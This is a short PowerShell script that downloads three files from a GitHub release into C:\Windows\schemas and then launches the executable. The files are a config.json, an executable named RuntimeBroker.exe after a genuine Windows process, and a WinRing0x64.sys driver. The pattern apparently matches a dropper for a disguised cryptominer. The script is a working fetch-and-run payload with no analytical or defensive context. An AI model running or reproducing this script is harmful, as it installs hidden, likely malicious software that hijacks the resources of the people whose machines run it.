Start-BitsTransfer -Source 'https://github.com/so251/olaquerida/releases/download/1releasae/config.json' -Destination 'C:\Windows\schemas\config.json' 
Start-BitsTransfer -Source 'https://github.com/so251/olaquerida/releases/download/1releasae/RuntimeBroker.exe' -Destination 'C:\Windows\schemas\RuntimeBroker.exe' 
Start-BitsTransfer -Source 'https://github.com/so251/olaquerida/releases/download/1releasae/WinRing0x64.sys' -Destination 'C:\Windows\schemas\WinRing0x64.sys' 
Start-Process "C:\Windows\schemas\RuntimeBroker.exe"
